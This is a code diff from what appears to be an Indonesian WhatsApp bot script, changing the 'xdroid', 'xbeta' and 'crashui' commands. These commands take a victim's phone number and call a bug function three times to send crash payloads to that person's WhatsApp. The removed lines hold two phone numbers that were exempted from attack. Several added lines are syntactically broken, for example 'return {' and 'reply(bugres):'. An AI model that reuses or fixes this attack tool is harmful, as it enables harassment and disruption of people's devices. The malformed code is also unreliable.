@@ -2134,22 +2134,16 @@ reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Vi
 break
 
 case 'xdroid': case 'xbeta': case 'crashui': 
-if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
-victim = text.split("|")[0]
-target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-var contactInfo = await viper.onWhatsApp(target);
-  if (victim == "6283809358811") {
-    return;
-    }
-    if (victim == "6285929014979") {
-    return;
-    }
-  if (contactInfo.length == 0) {
-    return reply("The number is not registered on WhatsApp");
-  }
+if (!isPremium) {
+return reply(mess.only.premium);
+}
+if (!q) return {
+reply(`Example: ${prefix + command} 62×××`);
+}
+
+let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   
-reply(bugres)
+reply(bugres):
 await sleep(1000)
 for (let i = 0; i < 3; i++) {
 await buk1(viper, target, (cct = true), (Ptcp = true));
